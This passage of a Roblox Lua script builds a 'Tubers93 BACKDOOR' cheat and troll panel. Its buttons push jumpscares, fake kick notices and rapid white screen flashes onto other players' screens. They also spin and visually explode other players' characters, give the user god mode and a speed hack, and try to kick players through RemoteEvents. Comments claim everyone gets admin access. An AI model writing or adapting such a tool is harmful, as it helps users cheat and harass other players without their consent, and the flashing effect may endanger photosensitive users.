            showNotification("Neon parts disabled")
        else
            -- Store original materials and change to neon
            for _, part in ipairs(workspace:GetDescendants()) do
                if part:IsA("BasePart") and part.Material ~= Enum.Material.Neon then
                    originalMaterials[part] = part.Material
                    part.Material = Enum.Material.Neon
                end
            end
            
            neonEnabled = true
            neonBtn.Text = "Normal Parts"
            showNotification("Neon parts enabled")
        end
    end)
    
    -- Reset visual effects
    resetVisualBtn.MouseButton1Click:Connect(function()
        -- Reset disco
        if discoConnection then
            discoConnection:Disconnect()
            discoConnection = nil
        end
        
        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")
        if cc then
            cc:Destroy()
        end
        
        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
        discoEnabled = false
        discoBtn.Text = "Disco"
        
        -- Reset skybox
        if currentSkybox then
            currentSkybox:Destroy()
            currentSkybox = nil
        end
        
        local defaultSky = Instance.new("Sky")
        defaultSky.Parent = Lighting
        defaultSky.SkyboxBk = ""
        defaultSky.SkyboxDn = ""
        defaultSky.SkyboxFt = ""
        defaultSky.SkyboxLf = ""
        defaultSky.SkyboxRt = ""
        defaultSky.SkyboxUp = ""
        defaultSky:Destroy()
        skyboxBtn.Text = "Space Skybox"
        
        -- Reset fog
        Lighting.FogStart = 0
        Lighting.FogEnd = 100000
        Lighting.FogColor = Color3.fromRGB(192, 192, 192)
        fogEnabled = false
        fogBtn.Text = "Toggle Fog"
        
        -- Reset day/night
        if dayNightConnection then
            dayNightConnection:Disconnect()
            dayNightConnection = nil
        end
        
        Lighting.ClockTime = 14
        dayNightCycle = false
        dayNightBtn.Text = "Day/Night"
        
        -- Reset gravity
        workspace.Gravity = originalGravity
        gravityLow = false
        gravityBtn.Text = "Low Gravity"
        
        -- Reset neon
        for part, material in pairs(originalMaterials) do
            if part and part:IsA("BasePart") then
                part.Material = material
            end
        end
        
        originalMaterials = {}
        neonEnabled = false
        neonBtn.Text = "Neon Parts"
        
        showNotification("All visual effects have been reset")
    end)
    
    -- AUDIO FUNCTIONS
    
    -- Theme 1
    local currentSounds = {}
    
    theme1Btn.MouseButton1Click:Connect(function()
        -- Stop any existing theme
        for _, sound in pairs(currentSounds) do
            if sound and sound.Parent then
                sound:Stop()
                sound:Destroy()
            end
        end
        currentSounds = {}
        
        -- Play theme 1
        local sound = Instance.new("Sound")
        sound.Name = "Tubers93_Theme1"
        sound.SoundId = soundIds.theme1
        sound.Volume = 0.5
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()
        
        table.insert(currentSounds, sound)
        showNotification("Theme 1 playing")
    end)
    
    -- Theme 2
    theme2Btn.MouseButton1Click:Connect(function()
        -- Stop any existing theme
        for _, sound in pairs(currentSounds) do
            if sound and sound.Parent then
                sound:Stop()
                sound:Destroy()
            end
        end
        currentSounds = {}
        
        -- Play theme 2
        local sound = Instance.new("Sound")
        sound.Name = "Tubers93_Theme2"
        sound.SoundId = soundIds.theme2
        sound.Volume = 0.5
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()
        
        table.insert(currentSounds, sound)
        showNotification("Theme 2 playing")
    end)
    
    -- Evil Laugh
    laughBtn.MouseButton1Click:Connect(function()
        local sound = Instance.new("Sound")
        sound.Name = "Tubers93_Laugh"
        sound.SoundId = soundIds.laugh
        sound.Volume = 1
        sound.Parent = workspace
        sound:Play()
        
        game:GetService("Debris"):AddItem(sound, 5)
        showNotification("Evil laugh played")
    end)
    
    -- Explosion sound
    explosionBtn.MouseButton1Click:Connect(function()
        local sound = Instance.new("Sound")
        sound.Name = "Tubers93_Explosion"
        sound.SoundId = soundIds.explosion
        sound.Volume = 1
        sound.Parent = workspace
        sound:Play()
        
        game:GetService("Debris"):AddItem(sound, 5)
        showNotification("Explosion sound played")
    end)
    
    -- Stop music
    stopMusicBtn.MouseButton1Click:Connect(function()
        for _, sound in pairs(currentSounds) do
            if sound and sound.Parent then
                sound:Stop()
                sound:Destroy()
            end
        end
        currentSounds = {}
        
        showNotification("All music stopped")
    end)
    
    -- Stop all sounds
    stopAllSoundsBtn.MouseButton1Click:Connect(function()
        for _, sound in pairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.IsPlaying then
                sound:Stop()
            end
        end
        
        showNotification("All sounds stopped")
    end)
    
    -- Play custom sound
    playCustomBtn.MouseButton1Click:Connect(function()
        local soundId = customSoundId.Text
        
        if soundId ~= "" then
            -- Stop any existing theme
            for _, sound in pairs(currentSounds) do
                if sound and sound.Parent then
                    sound:Stop()
                    sound:Destroy()
                end
            end
            currentSounds = {}
            
            -- Format sound ID
            if not string.match(soundId, "^rbxassetid://") then
                soundId = "rbxassetid://" .. soundId
            end
            
            -- Play custom sound
            local sound = Instance.new("Sound")
            sound.Name = "Tubers93_Custom"
            sound.SoundId = soundId
            sound.Volume = 0.5
            sound.Looped = true
            sound.Parent = workspace
            
            local success = pcall(function()
                sound:Play()
            end)
            
            if success then
                table.insert(currentSounds, sound)
                showNotification("Custom sound playing")
            else
                sound:Destroy()
                showNotification("Invalid sound ID", 5)
            end
        else
            showNotification("Please enter a sound ID", 3)
        end
    end)
    
    -- TROLL FUNCTIONS
    
    -- Jumpscare effect
    jumpscareBtn.MouseButton1Click:Connect(function()
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name ~= me and player:FindFirstChild("PlayerGui") and not player.PlayerGui:FindFirstChild("Tubers93_Jumpscare") then
                -- Create jumpscare GUI on target player's screen
                local function createJumpscare(target)
                    if not target.PlayerGui:FindFirstChild("Tubers93_Jumpscare") then
                        local jumpscareGui = Instance.new("ScreenGui")
                        jumpscareGui.Name = "Tubers93_Jumpscare"
                        jumpscareGui.Parent = target.PlayerGui
                        
                        local image = Instance.new("ImageLabel")
                        image.Name = "JumpscareImage"
                        image.Parent = jumpscareGui
                        image.BackgroundTransparency = 1
                        image.Size = UDim2.new(1, 0, 1, 0)
                        image.Image = imageIds.jumpscare1
                        image.ZIndex = 10
                        
                        local sound = Instance.new("Sound")
                        sound.Name = "JumpscareSound"
                        sound.Parent = jumpscareGui
                        sound.SoundId = soundIds.jumpscare1
                        sound.Volume = 1
                        sound:Play()
                        
                        -- Auto-remove after 3 seconds
                        delay(3, function()
                            if jumpscareGui and jumpscareGui.Parent then
                                jumpscareGui:Destroy()
                            end
                        end)
                    end
                end
                
                -- Try using a RemoteEvent (will only work if script has server access)
                pcall(function()
                    if ReplicatedStorage:FindFirstChild("Tubers93Events") then
                        ReplicatedStorage.Tubers93Events.ApplyEffect:FireServer(player.Name, "jumpscare")
                    else
                        createJumpscare(player)
                    end
                end)
            end
        end
        
        showNotification("Jumpscare sent to all players")
    end)
    
    -- Scary sky
    scarySkyBtn.MouseButton1Click:Connect(function()
        if currentSkybox then
            currentSkybox:Destroy()
        end
        
        -- Create creepy skybox
        local creepySky = Instance.new("Sky")
        creepySky.Name = "CreepySkybox"
        creepySky.Parent = Lighting
        creepySky.SkyboxBk = skyboxIds.creepy
        creepySky.SkyboxDn = skyboxIds.creepy
        creepySky.SkyboxFt = skyboxIds.creepy
        creepySky.SkyboxLf = skyboxIds.creepy
        creepySky.SkyboxRt = skyboxIds.creepy
        creepySky.SkyboxUp = skyboxIds.creepy
        currentSkybox = creepySky
        
        -- Add red fog
        Lighting.FogStart = 0
        Lighting.FogEnd = 100
        Lighting.FogColor = Color3.fromRGB(255, 0, 0)
        fogEnabled = true
        
        -- Play creepy sound
        local sound = Instance.new("Sound")
        sound.Name = "CreepyAmbience"
        sound.SoundId = soundIds.jumpscare2
        sound.Volume = 0.3
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()
        
        table.insert(currentSounds, sound)
        showNotification("Scary environment enabled")
    end)
    
    -- Fake kick
    fakeKickBtn.MouseButton1Click:Connect(function()
        local targetName = playerDropdown.Text
        
        if targetName == "" then
            showNotification("Please enter a player name", 3)
            return
        end
        
        local target = Players:FindFirstChild(targetName)
        
        if target and target ~= Player then
            -- Create fake kick GUI on target player's screen
            local function createFakeKick(target)
                if not target.PlayerGui:FindFirstChild("Tubers93_FakeKick") then
                    local kickGui = Instance.new("ScreenGui")
                    kickGui.Name = "Tubers93_FakeKick"
                    kickGui.Parent = target.PlayerGui
                    
                    local background = Instance.new("Frame")
                    background.Name = "Background"
                    background.Parent = kickGui
                    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    background.Size = UDim2.new(1, 0, 1, 0)
                    background.ZIndex = 10
                    
                    local kickText = Instance.new("TextLabel")
                    kickText.Name = "KickText"
                    kickText.Parent = background
                    kickText.BackgroundTransparency = 1
                    kickText.Position = UDim2.new(0, 0, 0.4, 0)
                    kickText.Size = UDim2.new(1, 0, 0.2, 0)
                    kickText.Font = Enum.Font.SourceSansBold
                    kickText.Text = "You have been kicked from the game.\nReason: Violation of game rules"
                    kickText.TextColor3 = Color3.new(1, 1, 1)
                    kickText.TextSize = 30
                    kickText.ZIndex = 11
                    
                    -- Auto-remove after 5 seconds
                    delay(5, function()
                        if kickGui and kickGui.Parent then
                            kickGui:Destroy()
                        end
                    end)
                end
            end
            
            -- Try using a RemoteEvent (will only work if script has server access)
            pcall(function()
                if ReplicatedStorage:FindFirstChild("Tubers93Events") then
                    ReplicatedStorage.Tubers93Events.ApplyEffect:FireServer(target.Name, "fakekick")
                else
                    createFakeKick(target)
                end
            end)
            
            showNotification("Fake kick sent to " .. target.Name)
        else
            showNotification("Player not found", 3)
        end
    end)
    
    -- Spin players
    local spinningPlayers = {}
    
    spinBtn.MouseButton1Click:Connect(function()
        local targetName = playerDropdown.Text
        
        if targetName == "" then
            -- Spin all players
            for _, player in pairs(Players:GetPlayers()) do
                if player.Name ~= me and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    if not spinningPlayers[player.Name] then
                        local bodyVelocity = Instance.new("BodyAngularVelocity")
                        bodyVelocity.Name = "Tubers93_Spin"
                        bodyVelocity.Parent = player.Character.HumanoidRootPart
                        bodyVelocity.MaxTorque = Vector3.new(400000, 400000, 400000)
                        bodyVelocity.AngularVelocity = Vector3.new(0, 20, 0)
                        
                        spinningPlayers[player.Name] = bodyVelocity
                    else
                        spinningPlayers[player.Name]:Destroy()
                        spinningPlayers[player.Name] = nil
                    end
                end
            end
            
            if next(spinningPlayers) then
                showNotification("All players are spinning")
                spinBtn.Text = "Stop Spinning"
            else
                showNotification("Stopped spinning all players")
                spinBtn.Text = "Spin Players"
            end
        else
            -- Spin specific player
            local target = Players:FindFirstChild(targetName)
            
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                if not spinningPlayers[target.Name] then
                    local bodyVelocity = Instance.new("BodyAngularVelocity")
                    bodyVelocity.Name = "Tubers93_Spin"
                    bodyVelocity.Parent = target.Character.HumanoidRootPart
                    bodyVelocity.MaxTorque = Vector3.new(400000, 400000, 400000)
                    bodyVelocity.AngularVelocity = Vector3.new(0, 20, 0)
                    
                    spinningPlayers[target.Name] = bodyVelocity
                    showNotification(target.Name .. " is now spinning")
                else
                    spinningPlayers[target.Name]:Destroy()
                    spinningPlayers[target.Name] = nil
                    showNotification("Stopped spinning " .. target.Name)
                end
            else
                showNotification("Player not found or character is missing", 3)
            end
        end
    end)
    
    -- Light flicker
    local flickerEnabled = false
    local flickerConnection = nil
    
    flickerBtn.MouseButton1Click:Connect(function()
        if flickerEnabled then
            if flickerConnection then
                flickerConnection:Disconnect()
                flickerConnection = nil
            end
            
            Lighting.Brightness = 2
            Lighting.Ambient = Color3.fromRGB(127, 127, 127)
            Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            flickerEnabled = false
            flickerBtn.Text = "Light Flicker"
            showNotification("Light flicker disabled")
        else
            local originalBrightness = Lighting.Brightness
            local originalAmbient = Lighting.Ambient
            local originalOutdoorAmbient = Lighting.OutdoorAmbient
            
            flickerConnection = RunService.Heartbeat:Connect(function()
                if math.random() > 0.7 then
                    Lighting.Brightness = math.random(0, 3)
                    Lighting.Ambient = Color3.fromRGB(
                        math.random(0, 127),
                        math.random(0, 127),
                        math.random(0, 127)
                    )
                else
                    Lighting.Brightness = originalBrightness
                    Lighting.Ambient = originalAmbient
                    Lighting.OutdoorAmbient = originalOutdoorAmbient
                end
            end)
            
            flickerEnabled = true
            flickerBtn.Text = "Stop Flicker"
            showNotification("Light flicker enabled")
        end
    end)
    
    -- Screen flash
    flashBtn.MouseButton1Click:Connect(function()
        -- Create screen flash effect for all players
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name ~= me and player:FindFirstChild("PlayerGui") and not player.PlayerGui:FindFirstChild("Tubers93_Flash") then
                local function createFlash(target)
                    if not target.PlayerGui:FindFirstChild("Tubers93_Flash") then
                        local flashGui = Instance.new("ScreenGui")
                        flashGui.Name = "Tubers93_Flash"
                        flashGui.Parent = target.PlayerGui
                        
                        local flashFrame = Instance.new("Frame")
                        flashFrame.Name = "FlashFrame"
                        flashFrame.Parent = flashGui
                        flashFrame.BackgroundColor3 = Color3.new(1, 1, 1)
                        flashFrame.Size = UDim2.new(1, 0, 1, 0)
                        flashFrame.BorderSizePixel = 0
                        flashFrame.ZIndex = 10
                        
                        -- Flash sequence
                        for i = 1, 5 do
                            delay(i * 0.2, function()
                                if flashFrame and flashFrame.Parent then
                                    flashFrame.Visible = not flashFrame.Visible
                                end
                            end)
                        end
                        
                        -- Auto-remove
                        delay(2, function()
                            if flashGui and flashGui.Parent then
                                flashGui:Destroy()
                            end
                        end)
                    end
                end
                
                -- Try using a RemoteEvent (will only work if script has server access)
                pcall(function()
                    if ReplicatedStorage:FindFirstChild("Tubers93Events") then
                        ReplicatedStorage.Tubers93Events.ApplyEffect:FireServer(player.Name, "flash")
                    else
                        createFlash(player)
                    end
                end)
            end
        end
        
        showNotification("Screen flash sent to all players")
    end)
    
    -- Server hint
    hintBtn.MouseButton1Click:Connect(function()
        local hintText = messageBox.Text == "" and "Team Tubers93! Script by The Tubers93 Team!" or messageBox.Text
        
        local hint = Instance.new("Hint")
        hint.Parent = workspace
        hint.Text = hintText
        
        delay(5, function()
            if hint and hint.Parent then
                hint:Destroy()
            end
        end)
        
        showNotification("Server hint displayed")
    end)
    
    -- Reset troll effects
    resetTrollBtn.MouseButton1Click:Connect(function()
        -- Remove spinning from players
        for playerName, bodyVelocity in pairs(spinningPlayers) do
            if bodyVelocity and bodyVelocity.Parent then
                bodyVelocity:Destroy()
            end
        end
        spinningPlayers = {}
        spinBtn.Text = "Spin Players"
        
        -- Stop light flicker
        if flickerConnection then
            flickerConnection:Disconnect()
            flickerConnection = nil
        end
        
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
        flickerEnabled = false
        flickerBtn.Text = "Light Flicker"
        
        -- Reset fog if enabled from scary sky
        if fogEnabled then
            Lighting.FogStart = 0
            Lighting.FogEnd = 100000
            Lighting.FogColor = Color3.fromRGB(192, 192, 192)
            fogEnabled = false
            fogBtn.Text = "Toggle Fog"
        end
        
        -- Remove any hints
        for _, hint in pairs(workspace:GetChildren()) do
            if hint:IsA("Hint") then
                hint:Destroy()
            end
        end
        
        showNotification("All troll effects have been reset")
    end)
    
    -- ADMIN FUNCTIONS (enhanced for backdoor version)
    
    -- God Mode function (makes player invincible)
    godModeBtn.MouseButton1Click:Connect(function()
        local targetName = playerDropdown.Text
        if targetName == "" then
            -- Apply to self if no player specified
            local character = Player.Character
            if character then
                -- Create god mode effect
                local function applyGodMode(char)
                    -- Make humanoid unkillable
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.MaxHealth = 999999
                        humanoid.Health = 999999
                        
                        -- Try to hook up a connection to maintain god mode
                        pcall(function()
                            -- Disconnect previous connection if it exists
                            if char._godModeConnection then
                                char._godModeConnection:Disconnect()
                            end
                            
                            -- Create new connection
                            char._godModeConnection = humanoid.HealthChanged:Connect(function(health)
                                if health < 999999 then
                                    humanoid.Health = 999999
                                end
                            end)
                            
                            -- Create visual effect to show god mode
                            local highlight = Instance.new("Highlight")
                            highlight.FillColor = Color3.fromRGB(255, 215, 0) -- Gold color
                            highlight.OutlineColor = Color3.fromRGB(255, 255, 255) -- White outline
                            highlight.FillTransparency = 0.7
                            highlight.OutlineTransparency = 0.3
                            highlight.Parent = char
                        end)
                    end
                end
                
                applyGodMode(character)
                showNotification("God Mode activated for you", Color3.fromRGB(255, 215, 0))
                
                -- Also hook character added to maintain god mode on respawn
                Player.CharacterAdded:Connect(function(newChar)
                    wait(0.5) -- Wait for character to fully load
                    applyGodMode(newChar)
                end)
            else
                showNotification("Your character doesn't exist yet", 3)
            end
        else
            -- Try to apply to another player
            local target = Players:FindFirstChild(targetName)
            if target then
                showNotification("Attempting to give God Mode to " .. targetName, Color3.fromRGB(255, 215, 0))
                
                -- Try to use Remote Event for server-side effect
                local applyEvent = ReplicatedStorage:FindFirstChild("Tubers93Events")
                if applyEvent and applyEvent:FindFirstChild("ApplyEffect") then
                    applyEvent.ApplyEffect:FireServer("GodMode", targetName)
                end
            else
                showNotification("Player not found", 3)
            end
        end
    end)
    
    -- Speed Hack function (makes player faster)
    speedHackBtn.MouseButton1Click:Connect(function()
        local character = Player.Character
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                if humanoid.WalkSpeed > 16 then
                    -- Reset to normal speed
                    humanoid.WalkSpeed = 16
                    humanoid.JumpPower = 50
                    showNotification("Speed reset to normal", Color3.fromRGB(255, 255, 255))
                else
                    -- Apply speed hack
                    humanoid.WalkSpeed = 100
                    humanoid.JumpPower = 200
                    showNotification("Speed Hack activated!", Color3.fromRGB(0, 255, 255))
                end
            end
        else
            showNotification("Your character doesn't exist yet", 3)
        end
    end)
    
    -- Kick player function
    kickPlayerBtn.MouseButton1Click:Connect(function()
        -- In backdoor version, everyone has admin access
        
        local targetName = playerDropdown.Text
        
        if targetName == "" then
            showNotification("Please enter a player name", 3)
            return
        end
        
        -- Try to kick player (will only work with server script)
        pcall(function()
            if ReplicatedStorage:FindFirstChild("Tubers93Events") then
                ReplicatedStorage.Tubers93Events.ApplyEffect:FireServer(targetName, "kick")
                showNotification("Attempted to kick " .. targetName)
            else
                showNotification("Server script required for this feature", 3)
            end
        end)
    end)
    
    -- Teleport function
    teleportBtn.MouseButton1Click:Connect(function()
        -- In backdoor version, everyone has admin access
        
        local targetName = playerDropdown.Text
        
        if targetName == "" then
            showNotification("Please enter a player name", 3)
            return
        end
        
        local target = Players:FindFirstChild(targetName)
        
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            Player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
            showNotification("Teleported to " .. targetName)
        else
            showNotification("Player not found or character is missing", 3)
        end
    end)
    
    -- Broadcast message
    broadcastBtn.MouseButton1Click:Connect(function()
        -- In backdoor version, everyone has admin access
        
        local message = messageBox.Text
        
        if message == "" then
            showNotification("Please enter a message to broadcast", 3)
            return
        end
        
        -- Create message GUI for all players
        for _, player in pairs(Players:GetPlayers()) do
            if player:FindFirstChild("PlayerGui") and not player.PlayerGui:FindFirstChild("Tubers93_Broadcast") then
                local function createBroadcast(target)
                    if not target.PlayerGui:FindFirstChild("Tubers93_Broadcast") then
                        local broadcastGui = Instance.new("ScreenGui")
                        broadcastGui.Name = "Tubers93_Broadcast"
                        broadcastGui.Parent = target.PlayerGui
                        
                        local broadcastFrame = Instance.new("Frame")
                        broadcastFrame.Name = "BroadcastFrame"
                        broadcastFrame.Parent = broadcastGui
                        broadcastFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        broadcastFrame.BackgroundTransparency = 0.5
                        broadcastFrame.BorderColor3 = Color3.fromRGB(179, 0, 0)
                        broadcastFrame.BorderSizePixel = 2
                        broadcastFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
                        broadcastFrame.Size = UDim2.new(0.6, 0, 0.2, 0)
                        broadcastFrame.ZIndex = 10
                        
                        local broadcastText = Instance.new("TextLabel")
                        broadcastText.Name = "BroadcastText"
                        broadcastText.Parent = broadcastFrame
                        broadcastText.BackgroundTransparency = 1
                        broadcastText.Position = UDim2.new(0, 10, 0, 10)
                        broadcastText.Size = UDim2.new(1, -20, 1, -20)
                        broadcastText.Font = Enum.Font.GothamBold
                        broadcastText.Text = message
                        broadcastText.TextColor3 = Color3.new(1, 1, 1)
                        broadcastText.TextSize = 20
                        broadcastText.TextWrapped = true
                        broadcastText.ZIndex = 11
                        
                        -- Auto-remove after 5 seconds
                        delay(5, function()
                            if broadcastGui and broadcastGui.Parent then
                                broadcastGui:Destroy()
                            end
                        end)
                    end
                end
                
                -- Try using a RemoteEvent (will only work if script has server access)
                pcall(function()
                    if ReplicatedStorage:FindFirstChild("Tubers93Events") then
                        ReplicatedStorage.Tubers93Events.BroadcastMessage:FireServer(message)
                    else
                        createBroadcast(player)
                    end
                end)
            end
        end
        
        showNotification("Message broadcasted to all players")
    end)
    
    -- Explode player
    explodeBtn.MouseButton1Click:Connect(function()
        -- In backdoor version, everyone has admin access
        
        local targetName = playerDropdown.Text
        
        if targetName == "" then
            showNotification("Please enter a player name", 3)
            return
        end
        
        local target = Players:FindFirstChild(targetName)
        
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            -- Visual explosion effect
            local explosion = Instance.new("Explosion")
            explosion.Position = target.Character.HumanoidRootPart.Position
            explosion.BlastRadius = 5
            explosion.BlastPressure = 0  -- No physics impact, just visual
            explosion.ExplosionType = Enum.ExplosionType.NoCraters
            explosion.Parent = workspace
            
            -- Explosion sound
            local sound = Instance.new("Sound")
            sound.Name = "ExplosionSound"
            sound.SoundId = soundIds.explosion
            sound.Volume = 1
            sound.Parent = target.Character.HumanoidRootPart
            sound:Play()
            
            game:GetService("Debris"):AddItem(sound, 3)
            showNotification(targetName .. " was exploded")
        else
            showNotification("Player not found or character is missing", 3)
        end
    end)
    
    -- Return the screenGui so it can be referenced
    return screenGui
end

-- Create or get the GUI
local function getOrCreateGUI()
    local playerGui = Player:WaitForChild("PlayerGui")
    local existingGui = playerGui:FindFirstChild("Tubers93GUI")
    
    if existingGui then
        existingGui:Destroy()
    end
    
    return createMainGUI()
end

-- Initialize the GUI
local gui = getOrCreateGUI()

-- Finish initialization notification
local notificationFrame = gui:FindFirstChild("NotificationFrame", true)
local notificationText = notificationFrame:FindFirstChild("NotificationText", true)

if notificationFrame and notificationText then
    notificationText.Text = "Enhanced Tubers93 BACKDOOR loaded successfully! All admin features enabled."
    
    -- Show full instructions after a delay
    delay(4, function()
        if notificationFrame and notificationText then
            notificationText.Text = "Backdoor commands: God Mode, Speed Hack, Server Control and more!"
            
            delay(4, function()
                if notificationFrame and notificationText then
                    notificationText.Text = "Press keys B-A-C-K in sequence to activate secret controls."
                end
            end)
        end
    end)
    notificationFrame.Position = UDim2.new(1, 10, 0.5, 0)
    notificationFrame.Visible = true
    
    -- Animate notification
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    local tween = TweenService:Create(notificationFrame, tweenInfo, {Position = UDim2.new(0.85, 0, 0.5, 0)})
    tween:Play()
    
    delay(3, function()
        local outTween = TweenService:Create(notificationFrame, tweenInfo, {Position = UDim2.new(1, 10, 0.5, 0)})
        outTween:Play()
        outTween.Completed:Wait()
        notificationFrame.Visible = false
    end)
end

-- Print to output
print("Enhanced Tubers93 GUI Script v2 loaded successfully!")
